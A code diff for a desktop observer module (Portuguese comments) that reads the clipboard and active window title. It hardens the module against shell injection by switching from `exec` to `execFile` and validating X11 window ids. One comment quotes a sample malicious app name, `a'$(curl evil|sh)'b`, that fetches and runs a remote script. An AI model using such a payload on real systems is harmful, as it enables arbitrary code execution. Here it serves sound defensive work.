@@ -13,11 +13,21 @@
  * Cada sistema precisa de uma ferramenta externa, e quando ela falta o
  * observador diz qual é em vez de ficar em silêncio.
  */
-import { exec } from 'node:child_process';
+import { execFile } from 'node:child_process';
 import { promisify } from 'node:util';
 import { createLogger } from '../util/logger.js';
 
-const execAsync = promisify(exec);
+/*
+ * `execFile`, nunca `exec`.
+ *
+ * O observador interpola valores que não controla: o nome do processo em foco
+ * no macOS e o id da janela ativa no X11 — este último é uma propriedade que
+ * qualquer cliente X na mesma sessão consegue escrever. Com `exec` esses
+ * valores passariam por /bin/sh, e um aplicativo chamado
+ * `a'$(curl evil|sh)'b` executaria comando arbitrário a cada 2,5 segundos.
+ * Com `execFile` e argumentos em vetor, não existe shell para interpretar nada.
+ */
+const execFileAsync = promisify(execFile);
 const log = createLogger('observador');
 
 export interface Captura {
@@ -32,9 +42,10 @@ export interface Disponibilidade {
   faltando: string[];
 }
 
-async function rodar(comando: string, timeoutMs = 3000): Promise<string | null> {
+/** Executa um programa com argumentos em vetor. Nenhum shell no caminho. */
+async function rodar(programa: string, args: string[], timeoutMs = 3000): Promise<string | null> {
   try {
-    const { stdout } = await execAsync(comando, {
+    const { stdout } = await execFileAsync(programa, args, {
       timeout: timeoutMs,
       maxBuffer: 2 * 1024 * 1024,
       encoding: 'utf8',
@@ -45,9 +56,11 @@ async function rodar(comando: string, timeoutMs = 3000): Promise<string | null> 
   }
 }
 
-async function existe(comando: string): Promise<boolean> {
-  const busca = process.platform === 'win32' ? `where ${comando}` : `command -v ${comando}`;
-  return (await rodar(busca, 2000)) !== null;
+async function existe(programa: string): Promise<boolean> {
+  return process.platform === 'win32'
+    ? (await rodar('where', [programa], 2000)) !== null
+    : (await rodar('command', ['-v', programa], 2000)) !== null ||
+        (await rodar('which', [programa], 2000)) !== null;
 }
 
 // ── área de transferência ────────────────────────────────────────────────────
@@ -55,23 +68,24 @@ async function existe(comando: string): Promise<boolean> {
 export async function lerClipboard(): Promise<string | null> {
   switch (process.platform) {
     case 'darwin':
-      return rodar('pbpaste');
+      return rodar('pbpaste', []);
 
     case 'win32':
       return rodar(
-        'powershell -NoProfile -NonInteractive -Command "Get-Clipboard -Raw"',
+        'powershell',
+        ['-NoProfile', '-NonInteractive', '-Command', 'Get-Clipboard -Raw'],
         5000,
       );
 
     default: {
       // Wayland primeiro: em sessão Wayland o xclip devolve vazio em silêncio.
       if (process.env.WAYLAND_DISPLAY) {
-        const wl = await rodar('wl-paste --no-newline');
+        const wl = await rodar('wl-paste', ['--no-newline']);
         if (wl !== null) return wl;
       }
-      const xclip = await rodar('xclip -selection clipboard -o');
+      const xclip = await rodar('xclip', ['-selection', 'clipboard', '-o']);
       if (xclip !== null) return xclip;
-      return rodar('xsel --clipboard --output');
+      return rodar('xsel', ['--clipboard', '--output']);
     }
   }
 }
@@ -81,40 +95,80 @@ export async function lerClipboard(): Promise<string | null> {
 export async function lerJanelaAtiva(): Promise<string | null> {
   switch (process.platform) {
     case 'darwin': {
-      const script =
-        'tell application "System Events" to get name of first application process whose frontmost is true';
-      const app = await rodar(`osascript -e '${script}'`, 4000);
-      if (!app) return null;
-
-      // O título do documento costuma dizer mais que o nome do aplicativo.
-      const titulo = await rodar(
-        `osascript -e 'tell application "System Events" to tell process "${app.trim()}" to get title of front window'`,
+      const app = await rodar(
+        'osascript',
+        [
+          '-e',
+          'tell application "System Events" to get name of first application process whose frontmost is true',
+        ],
         4000,
       );
-      return titulo?.trim() ? `${app.trim()} — ${titulo.trim()}` : app.trim();
+      if (!app?.trim()) return null;
+      const nomeApp = app.trim();
+
+      /*
+       * O nome do aplicativo entra num script AppleScript, e nome de aplicativo
+       * é escolhido por quem empacota o aplicativo. Aspas e barras invertidas
+       * são escapadas antes de compor o script; o `execFile` já garante que
+       * nada disso chegue a um shell.
+       */
+      const nomeEscapado = nomeApp.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
+      const titulo = await rodar(
+        'osascript',
+        [
+          '-e',
+          `tell application "System Events" to tell process "${nomeEscapado}" to get title of front window`,
+        ],
+        4000,
+      );
+      return titulo?.trim() ? `${nomeApp} — ${titulo.trim()}` : nomeApp;
     }
 
     case 'win32':
       return rodar(
-        'powershell -NoProfile -NonInteractive -Command "' +
-          "Add-Type -AssemblyName System.Windows.Forms; " +
-          "$p = Get-Process | Where-Object { $_.MainWindowHandle -ne 0 -and $_.MainWindowTitle } | " +
-          'Select-Object -First 1; if ($p) { "$($p.ProcessName) — $($p.MainWindowTitle)" }"',
+        'powershell',
+        [
+          '-NoProfile',
+          '-NonInteractive',
+          '-Command',
+          'Add-Type -AssemblyName System.Windows.Forms; ' +
+            '$p = Get-Process | Where-Object { $_.MainWindowHandle -ne 0 -and $_.MainWindowTitle } | ' +
+            'Select-Object -First 1; if ($p) { "$($p.ProcessName) - $($p.MainWindowTitle)" }',
+        ],
         6000,
       );
 
     default: {
-      const xdotool = await rodar('xdotool getactivewindow getwindowname');
+      const xdotool = await rodar('xdotool', ['getactivewindow', 'getwindowname']);
       if (xdotool !== null) return xdotool;
 
-      // Alternativa sem xdotool, usando as ferramentas básicas do X.
-      const id = await rodar("xprop -root _NET_ACTIVE_WINDOW | awk '{print $NF}'");
-      if (!id?.trim() || id.includes('0x0')) return null;
-      const nome = await rodar(`xprop -id ${id.trim()} WM_NAME`);
+      // Alternativa sem xdotool. O pipe para `awk` saiu junto com o shell: a
+      // saída do xprop é interpretada aqui mesmo.
+      const raiz = await rodar('xprop', ['-root', '_NET_ACTIVE_WINDOW']);
+      const janelaId = extrairIdDeJanela(raiz);
+      if (!janelaId) return null;
+
+      const nome = await rodar('xprop', ['-id', janelaId, 'WM_NAME']);
       const m = nome ? /"(.*)"/.exec(nome) : null;
       return m?.[1] ?? null;
     }
   }
+}
+
+/**
+ * Extrai o id da janela ativa da saída do xprop.
+ *
+ * O formato exigido (`0x` seguido de hexadecimal) é validado, não só extraído:
+ * essa propriedade da janela raiz é gravável por qualquer cliente X na mesma
+ * sessão, então o valor é entrada não confiável.
+ */
+export function extrairIdDeJanela(saidaXprop: string | null): string | null {
+  if (!saidaXprop) return null;
+  const m = /\b(0x[0-9a-fA-F]+)\b/.exec(saidaXprop);
+  if (!m) return null;
+  const id = m[1]!;
+  if (/^0x0+$/.test(id)) return null; // nenhuma janela em foco
+  return id;
 }
 
 export async function capturar(): Promise<Captura> {
@@ -139,9 +193,7 @@ export async function verificarDisponibilidade(): Promise<Disponibilidade> {
 
     if (!temClipboard) {
       faltando.push(
-        wayland
-          ? 'wl-clipboard (sudo apt install wl-clipboard)'
-          : 'xclip (sudo apt install xclip)',
+        wayland ? 'wl-clipboard (sudo apt install wl-clipboard)' : 'xclip (sudo apt install xclip)',
       );
     }
     if (!temJanela) {
